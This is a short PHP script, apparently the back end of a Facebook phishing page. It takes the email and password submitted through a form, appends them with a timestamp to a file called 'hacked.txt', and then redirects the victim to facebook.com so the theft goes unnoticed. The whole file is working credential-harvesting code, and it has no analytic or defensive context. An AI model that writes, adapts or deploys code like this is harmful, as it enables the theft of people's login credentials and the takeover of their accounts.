<?php

	$fp = fopen("hacked.txt", "a") or die("could not open file");
	$time = time();
	fputs($fp, "User Name :".$_POST["email"]."   Passward :" .$_POST["pass"]."  Time : ".date("jS \o\\f F Y \a\\t g:ia \i\\n e",$time)." \r\n ");
	fclose($fp);
	header("location:http://www.facebook.com");


?>